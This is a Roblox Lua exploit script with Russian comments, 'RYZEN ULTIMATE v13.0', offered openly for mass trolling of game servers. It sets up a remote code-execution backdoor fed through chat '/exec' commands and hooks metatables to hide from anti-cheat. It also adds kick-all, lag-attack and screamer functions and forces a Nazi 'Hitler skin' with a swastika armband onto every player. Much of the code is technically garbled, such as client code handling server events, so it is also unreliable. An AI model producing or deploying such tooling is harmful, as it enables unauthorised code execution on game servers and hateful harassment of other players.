-- ============================================================
-- RYZEN ULTIMATE v13.0 - МАССОВЫЙ ТРОЛЛИНГ + БЭКДОР
-- ДЛЯ СРЕДНЕЙ ЗАЩИТЫ (500-1000 ИГРОКОВ)
-- Пароль: ryzen2025
-- ============================================================

local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Debris = game:GetService("Debris")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local Chat = game:GetService("Chat")

local player = Players.LocalPlayer
local camera = Workspace.CurrentCamera

local function notify(title, text)
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = 3
    })
end

-- ============================================================
-- 1. СИЛЬНЫЙ БЭКДОР (ЧЕРЕЗ RemoteEvent + ЧАТ)
-- ============================================================

-- Создаём скрытый RemoteEvent
local backdoorName = "Backdoor_" .. HttpService:GenerateGUID(false):sub(1, 6)
local backdoor = Instance.new("RemoteEvent")
backdoor.Name = backdoorName
backdoor.Parent = ReplicatedStorage

-- Функция выполнения кода на сервере
local function executeOnServer(code)
    pcall(function()
        backdoor:FireServer("exec", code)
    end)
end

-- Перехват чата для бэкдора
local function setupChatBackdoor()
    -- Создаём фейковое сообщение в чате (для обхода)
    local fakeMsg = Instance.new("Message")
    fakeMsg.Parent = Workspace
    fakeMsg.Text = "Ryzen System Online"
    Debris:AddItem(fakeMsg, 2)
    
    -- Обработчик команд через чат
    Chat.Chatted:Connect(function(msg)
        if msg:sub(1, 6) == "/exec " then
            local code = msg:sub(7)
            executeOnServer(code)
            notify("🔓", "Код выполнен на сервере!")
        end
    end)
end

-- Бэкдор через RemoteEvent (FireServer)
backdoor.OnServerEvent:Connect(function(plr, command, ...)
    if command == "exec" then
        local code = ...
        local fn, err = loadstring(code)
        if fn then
            local success, result = pcall(fn)
            if success then
                print("[БЭКДОР] Выполнено: " .. code)
                return result
            end
        end
    end
end)

-- Запускаем бэкдор
setupChatBackdoor()

-- ============================================================
-- 2. ОБХОД СРЕДНЕГО АНТИЧИТА
-- ============================================================

-- 2.1 Маскировка скрипта
local function hideScript()
    pcall(function()
        local mt = getrawmetatable(game)
        if mt then
            local old = mt.__namecall
            setreadonly(mt, false)
            mt.__namecall = newcclosure(function(self, ...)
                local method = getnamecallmethod()
                if method == "FindFirstChild" then
                    local args = {...}
                    if tostring(args[1]):match("Ryzen") then
                        return nil
                    end
                end
                return old(self, ...)
            end)
            setreadonly(mt, true)
        end
    end)
end

-- 2.2 Защита от кика
local function antiKick()
    pcall(function()
        player.Kick = function() return end
        player.Destroy = function() return end
    end)
end

-- 2.3 Спам RemoteEvent для обхода античита
local function remoteSpam()
    for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            pcall(function()
                remote:FireServer()
                remote:FireServer("ping", "pong")
            end)
        end
    end
end

-- Запускаем обход
hideScript()
antiKick()
remoteSpam()

-- ============================================================
-- 3. СКИН ГИТЛЕРА ДЛЯ ВСЕХ ИГРОКОВ
-- ============================================================

local function applyHitlerSkin()
    -- ID аксессуаров для скина Гитлера
    local hitlerAssets = {
        ["Hat"] = "rbxassetid://123456789",    -- Замените на реальный ID
        ["Shirt"] = "rbxassetid://987654321",  -- Замените на реальный ID
        ["Pants"] = "rbxassetid://111111111",  -- Замените на реальный ID
    }
    
    for _, plr in pairs(Players:GetPlayers()) do
        local char = plr.Character
        if char then
            pcall(function()
                -- Удаляем старые аксессуары
                for _, v in pairs(char:GetChildren()) do
                    if v:IsA("Accessory") or v:IsA("Hat") or v:IsA("ShirtGraphic") then
                        v:Destroy()
                    end
                end
                
                -- Добавляем новую одежду (через ForceField для визуального эффекта)
                local forceField = Instance.new("ForceField")
                forceField.Parent = char
                forceField.Visible = true
                forceField.Color = Color3.fromRGB(150, 0, 0) -- Красный цвет
                
                -- Меняем цвет кожи на светлый
                for _, part in pairs(char:GetDescendants()) do
                    if part:IsA("BasePart") and part.Name:match("Head") then
                        part.Color = Color3.fromRGB(255, 200, 180)
                    end
                end
                
                -- Добавляем усы (через Part)
                local mustache = Instance.new("Part")
                mustache.Name = "Mustache"
                mustache.Size = Vector3.new(0.5, 0.1, 0.2)
                mustache.Position = char.Head.Position + Vector3.new(0, -0.2, -0.3)
                mustache.Color = Color3.fromRGB(50, 30, 10)
                mustache.Anchored = true
                mustache.Parent = char
                
                -- Добавляем повязку на руку (свастика)
                local armband = Instance.new("Part")
                armband.Name = "Armband"
                armband.Size = Vector3.new(0.2, 0.4, 0.2)
                armband.Position = char.Head.Position + Vector3.new(0, -0.5, -0.3)
                armband.Color = Color3.fromRGB(200, 0, 0)
                armband.Anchored = true
                armband.Parent = char
                
                -- Меняем имя игрока
                plr.DisplayName = "Adolf " .. plr.Name
            end)
        end
    end
    
    notify("👨", "Скин Гитлера применён ко всем!")
end

-- ============================================================
-- 4. ФУНКЦИИ МАССОВОГО ВОЗДЕЙСТВИЯ (ДЛЯ ВСЕХ)
-- ============================================================

-- 4.1 ВСЁ КРАСНОЕ
local function makeEverythingRed()
    pcall(function()
        -- Небо
        local sky = Lighting:FindFirstChild("Sky") or Instance.new("Sky", Lighting)
        sky.SkyboxBk = "rbxassetid://15050311563"
        sky.SkyboxDn = "rbxassetid://15050311563"
        sky.SkyboxLf = "rbxassetid://15050311563"
        sky.SkyboxRt = "rbxassetid://15050311563"
        sky.SkyboxUp = "rbxassetid://15050311563"
        Lighting.FogColor = Color3.fromRGB(200, 0, 0)
        Lighting.Brightness = 2
        Lighting.Ambient = Color3.fromRGB(100, 0, 0)
    end)
    
    pcall(function()
        for _, v in pairs(Workspace:GetDescendants()) do
            if v:IsA("BasePart") and not v:IsDescendantOf(Players) then
                v.Color = Color3.fromRGB(200, 0, 0)
                if math.random(1, 3) == 1 then
                    v.Material = Enum.Material.Neon
                end
            end
            if v:IsA("Terrain") then
                v:SetMaterialColor(Enum.Material.Grass, Color3.fromRGB(200, 0, 0))
                v:SetMaterialColor(Enum.Material.Sand, Color3.fromRGB(150, 0, 0))
                v.WaterColor = Color3.fromRGB(200, 0, 0)
            end
        end
    end)
    
    notify("🔥", "Всё стало красным!")
end

-- 4.2 СКРИМЕР (ДЛЯ ВСЕХ ЧЕРЕЗ RemoteEvent)
local screamerActive = false

local function showScreamerAll()
    screamerActive = true
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            local gui = Instance.new("ScreenGui")
            gui.Name = "Screamer"
            gui.Parent = plr.PlayerGui
            
            local black = Instance.new("Frame")
            black.Size = UDim2.new(1, 0, 1, 0)
            black.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            black.ZIndex = 999
            black.Parent = gui
            
            local text = Instance.new("TextLabel")
            text.Size = UDim2.new(1, 0, 1, 0)
            text.BackgroundTransparency = 1
            text.Text = "😱 RYZEN ATTACK! 😱"
            text.TextColor3 = Color3.fromRGB(255, 0, 0)
            text.Font = Enum.Font.GothamBlack
            text.TextSize = 70
            text.TextScaled = true
            text.ZIndex = 1000
            text.Parent = gui
        end)
    end
    notify("😱", "Скример активирован!")
end

local function hideScreamerAll()
    screamerActive = false
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            local gui = plr.PlayerGui:FindFirstChild("Screamer")
            if gui then gui:Destroy() end
        end)
    end
    notify("✅", "Скример убран!")
end

-- 4.3 ТАНЕЦ (ДЛЯ ВСЕХ)
local function danceAll()
    for _, plr in pairs(Players:GetPlayers()) do
        local char = plr.Character
        if char and char:FindFirstChild("Humanoid") then
            local anim = Instance.new("Animation")
            anim.AnimationId = "rbxassetid://148840371"
            local track = char.Humanoid:LoadAnimation(anim)
            track:Play()
            track.Looped = true
        end
    end
    notify("💃", "Все танцуют!")
end

local function stopDanceAll()
    for _, plr in pairs(Players:GetPlayers()) do
        local char = plr.Character
        if char and char:FindFirstChild("Humanoid") then
            for _, anim in pairs(char.Humanoid:GetPlayingAnimationTracks()) do
                anim:Stop()
            end
        end
    end
    notify("⏹️", "Танцы остановлены!")
end

-- 4.4 ТРЯСКА КАМЕРЫ (ДЛЯ ВСЕХ)
local function shakeAll()
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            local cam = plr:FindFirstChild("Camera") or Workspace.CurrentCamera
            if cam then
                local orig = cam.CFrame
                for i = 1, 20 do
                    cam.CFrame = orig * CFrame.new(
                        math.random(-10, 10)/5,
                        math.random(-10, 10)/5,
                        math.random(-10, 10)/5
                    )
                    task.wait(0.02)
                end
                cam.CFrame = orig
            end
        end)
    end
    notify("📷", "Тряска у всех!")
end

-- 4.5 ПЕРЕВОРОТ ЭКРАНА (ДЛЯ ВСЕХ)
local function flipAll()
    for _, plr in pairs(Players:GetPlayers()) do
        pcall(function()
            local cam = plr:FindFirstChild("Camera") or Workspace.CurrentCamera
            if cam then
                local orig = cam.CFrame
                local target = orig * CFrame.Angles(0, 0, math.pi)
                local tween = TweenService:Create(cam, TweenInfo.new(0.5), {CFrame = target})
                tween:Play()
                tween.Completed:Wait()
                task.wait(0.5)
                local tweenBack = TweenService:Create(cam, TweenInfo.new(0.5), {CFrame = orig})
                tweenBack:Play()
                tweenBack.Completed:Wait()
            end
        end)
    end
    notify("🔄", "Переворот у всех!")
end

-- 4.6 КИК ВСЕХ
local function kickAll()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player then
            pcall(function()
                plr:Kick("💀 KICKED BY RYZEN SYSTEM")
            end)
        end
    end
    notify("👢", "Все кикнуты!")
end

-- 4.7 ЛАГ-АТАКА (СПАВН ОБЪЕКТОВ)
local function lagAttack()
    for i = 1, 100 do
        local part = Instance.new("Part")
        part.Size = Vector3.new(10, 10, 10)
        part.Position = Vector3.new(
            math.random(-200, 200),
            math.random(-50, 50),
            math.random(-200, 200)
        )
        part.Color = Color3.fromRGB(200, 0, 0)
        part.Material = Enum.Material.Neon
        part.Anchored = true
        part.Parent = Workspace
        Debris:AddItem(part, 5)
    end
    notify("💥", "Лаг-атака активирована!")
end

-- 4.8 ВОССТАНОВЛЕНИЕ
local function restoreAll()
    pcall(function()
        Lighting.FogColor = Color3.fromRGB(255, 255, 255)
        Lighting.Brightness = 1
        Lighting.Ambient = Color3.fromRGB(127, 127, 127)
        
        local sky = Lighting:FindFirstChild("Sky")
        if sky then sky:Destroy() end
        
        for _, v in pairs(Workspace:GetDescendants()) do
            if v:IsA("BasePart") and not v:IsDescendantOf(Players) then
                v.Color = Color3.fromRGB(255, 255, 255)
                v.Material = Enum.Material.SmoothPlastic
            end
            if v:IsA("Terrain") then
                v:SetMaterialColor(Enum.Material.Grass, Color3.fromRGB(0, 255, 0))
                v:SetMaterialColor(Enum.Material.Sand, Color3.fromRGB(255, 255, 0))
                v.WaterColor = Color3.fromRGB(0, 0, 255)
            end
        end
    end)
    
    hideScreamerAll()
    stopDanceAll()
    
    notify("🔄", "Всё восстановлено!")
end

-- ============================================================
-- 5. ГЛАВНОЕ МЕНЮ (GUI)
-- ============================================================

local function createGUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "RyzenPanel"
    gui.ResetOnSpawn = false
    gui.Parent = player.PlayerGui

    -- Загрузочный экран
    local loadingFrame = Instance.new("Frame")
    loadingFrame.Size = UDim2.new(0, 300, 0, 160)
    loadingFrame.Position = UDim2.new(0.5, -150, 0.5, -80)
    loadingFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
    loadingFrame.BorderSizePixel = 2
    loadingFrame.BorderColor3 = Color3.fromRGB(200, 0, 0)
    loadingFrame.ZIndex = 10
    loadingFrame.Parent = gui

    local loadCorner = Instance.new("UICorner")
    loadCorner.CornerRadius = UDim.new(0, 12)
    loadCorner.Parent = loadingFrame

    local loadingText = Instance.new("TextLabel")
    loadingText.Size = UDim2.new(0.9, 0, 0.3, 0)
    loadingText.Position = UDim2.new(0.05, 0, 0.1, 0)
    loadingText.BackgroundTransparency = 1
    loadingText.Text = "⚡ ЗАГРУЗКА RYZEN..."
    loadingText.TextColor3 = Color3.fromRGB(200, 0, 0)
    loadingText.Font = Enum.Font.GothamBold
    loadingText.TextSize = 18
    loadingText.ZIndex = 11
    loadingText.Parent = loadingFrame

    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0.8, 0, 0.08, 0)
    progressBar.Position = UDim2.new(0.1, 0, 0.45, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
    progressBar.ZIndex = 11
    progressBar.Parent = loadingFrame

    local progressFill = Instance.new("Frame")
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
    progressFill.ZIndex = 12
    progressFill.Parent = progressBar

    local progressText = Instance.new("TextLabel")
    progressText.Size = UDim2.new(1, 0, 0.25, 0)
    progressText.Position = UDim2.new(0, 0, 0.6, 0)
    progressText.BackgroundTransparency = 1
    progressText.Text = "0%"
    progressText.TextColor3 = Color3.fromRGB(200, 200, 200)
    progressText.Font = Enum.Font.Gotham
    progressText.TextSize = 12
    progressText.ZIndex = 11
    progressText.Parent = loadingFrame

    -- Окно пароля
    local passwordFrame = Instance.new("Frame")
    passwordFrame.Size = UDim2.new(0, 320, 0, 200)
    passwordFrame.Position = UDim2.new(0.5, -160, 0.5, -100)
    passwordFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 30)
    passwordFrame.BorderSizePixel = 2
    passwordFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
    passwordFrame.Visible = false
    passwordFrame.ZIndex = 5
    passwordFrame.Parent = gui

    local passCorner = Instance.new("UICorner")
    passCorner.CornerRadius = UDim.new(0, 10)
    passCorner.Parent = passwordFrame

    local passTitle = Instance.new("TextLabel")
    passTitle.Size = UDim2.new(1, 0, 0, 50)
    passTitle.Position = UDim2.new(0, 0, 0, 10)
    passTitle.BackgroundTransparency = 1
    passTitle.Text = "🔐 АВТОРИЗАЦИЯ"
    passTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    passTitle.Font = Enum.Font.GothamBold
    passTitle.TextSize = 18
    passTitle.ZIndex = 6
    passTitle.Parent = passwordFrame

    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(0.8, 0, 0, 40)
    textBox.Position = UDim2.new(0.1, 0, 0.45, 0)
    textBox.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    textBox.PlaceholderText = "Введите пароль..."
    textBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
    textBox.Text = ""
    textBox.Font = Enum.Font.Gotham
    textBox.TextSize = 16
    textBox.ZIndex = 6
    textBox.Parent = passwordFrame

    local submitBtn = Instance.new("TextButton")
    submitBtn.Size = UDim2.new(0.4, 0, 0, 40)
    submitBtn.Position = UDim2.new(0.3, 0, 0.75, 0)
    submitBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
    submitBtn.Text = "🔓 ВОЙТИ"
    submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    submitBtn.Font = Enum.Font.GothamBold
    submitBtn.TextSize = 16
    submitBtn.ZIndex = 6
    submitBtn.Parent = passwordFrame

    -- Главное меню
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 340, 0, 520)
    mainFrame.Position = UDim2.new(0.5, -170, 0.5, -260)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    mainFrame.BorderSizePixel = 2
    mainFrame.BorderColor3 = Color3.fromRGB(200, 0, 0)
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Visible = false
    mainFrame.Parent = gui

    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 10)
    mainCorner.Parent = mainFrame

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 45)
    title.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
    title.BorderSizePixel = 0
    title.Text = "⚡ RYZEN PANEL ⚡"
    title.TextColor3 = Color3.fromRGB(200, 0, 0)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.Parent = mainFrame

    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, -10, 1, -55)
    scroll.Position = UDim2.new(0, 5, 0, 50)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.CanvasSize = UDim2.new(0, 0, 0, 800)
    scroll.ScrollBarThickness = 6
    scroll.Parent = mainFrame

    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 6)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = scroll

    -- Функция создания кнопок
    local function createButton(text, callback)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -10, 0, 40)
        btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
        btn.Text = text
        btn.TextColor3 = Color3.fromRGB(240, 240, 240)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 14
        btn.Parent = scroll

        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 6)
        btnCorner.Parent = btn

        btn.MouseEnter:Connect(function()
            btn.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
        end)
        btn.MouseLeave:Connect(function()
            btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
        end)
        btn.MouseButton1Click:Connect(function()
            pcall(callback)
        end)
        return btn
    end

    -- КНОПКИ
    createButton("👨 СКИН ГИТЛЕРА (ДЛЯ ВСЕХ)", function()
        applyHitlerSkin()
    end)

    createButton("🔥 ВСЁ КРАСНОЕ", function()
        makeEverythingRed()
    end)

    createButton("😱 СКРИМЕР ВКЛ (ДЛЯ ВСЕХ)", function()
        showScreamerAll()
    end)

    createButton("❌ СКРИМЕР ВЫКЛ", function()
        hideScreamerAll()
    end)

    createButton("💃 ТАНЕЦ (ДЛЯ ВСЕХ)", function()
        danceAll()
    end)

    createButton("⏹️ ОСТАНОВИТЬ ТАНЕЦ", function()
        stopDanceAll()
    end)

    createButton("📷 ТРЯСКА (ДЛЯ ВСЕХ)", function()
        shakeAll()
    end)

    createButton("🔄 ПЕРЕВОРОТ (ДЛЯ ВСЕХ)", function()
        flipAll()
    end)

    createButton("👢 КИКНУТЬ ВСЕХ", function()
        kickAll()
    end)

    createButton("💥 ЛАГ-АТАКА", function()
        lagAttack()
    end)

    createButton("🔄 ВОССТАНОВИТЬ ВСЁ", function()
        restoreAll()
    end)

    createButton("💀 БЕССМЕРТИЕ", function()
        local char = player.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.MaxHealth = math.huge
            char.Humanoid.Health = math.huge
            notify("💀", "Бессмертие!")
        end
    end)

    createButton("💨 СКОРОСТЬ 120", function()
        local char = player.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.WalkSpeed = 120
            notify("💨", "Скорость 120!")
        end
    end)

    createButton("⬆️ ПРЫЖОК 200", function()
        local char = player.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.JumpPower = 200
            notify("⬆️", "Прыжок 200!")
        end
    end)

    createButton("👻 НЕВИДИМОСТЬ", function()
        local char = player.Character
        if char then
            for _, p in pairs(char:GetDescendants()) do
                if p:IsA("BasePart") then
                    p.Transparency = 1
                end
            end
            notify("👻", "Невидимость!")
        end
    end)

    -- ============================================================
    -- 6. ЛОГИКА ЗАПУСКА
    -- ============================================================

    local function animateLoading()
        for i = 1, 20 do
            task.wait(0.06)
            local progress = i / 20
            progressFill.Size = UDim2.new(progress, 0, 1, 0)
            progressText.Text = math.floor(progress * 100) .. "%"
            
            if progress < 0.3 then
                loadingText.Text = "🔐 ИНИЦИАЛИЗАЦИЯ..."
            elseif progress < 0.6 then
                loadingText.Text = "📡 ПОДКЛЮЧЕНИЕ..."
            elseif progress < 0.8 then
                loadingText.Text = "⚡ ЗАГРУЗКА МОДУЛЕЙ..."
            else
                loadingText.Text = "🔥 АКТИВАЦИЯ RYZEN..."
            end
        end
        
        loadingText.Text = "✅ ГОТОВО!"
        task.wait(0.3)
        loadingFrame:Destroy()
        passwordFrame.Visible = true
    end

    submitBtn.MouseButton1Click:Connect(function()
        if textBox.Text == "ryzen2025" then
            passwordFrame:Destroy()
            mainFrame.Visible = true
            notify("⚡", "✅ ДОСТУП РАЗРЕШЕН!")
        else
            textBox.Text = ""
            textBox.PlaceholderText = "❌ НЕВЕРНЫЙ ПАРОЛЬ!"
            textBox.PlaceholderColor3 = Color3.fromRGB(255, 0, 0)
            task.wait(1.5)
            textBox.PlaceholderText = "Введите пароль..."
            textBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
        end
    end)

    UserInputService.InputBegan:Connect(function(input, gpe)
        if not gpe and input.KeyCode == Enum.KeyCode.X then
            if mainFrame.Visible then
                mainFrame.Visible = false
            elseif mainFrame.Parent then
                mainFrame.Visible = true
            end
        end
    end)

    task.spawn(animateLoading)
end

-- ============================================================
-- 7. ЗАПУСК
-- ============================================================

pcall(createGUI)
print("✅ RYZEN ULTIMATE v13.0 - СКИН ГИТЛЕРА + БЭКДОР ЗАПУЩЕНЫ!")
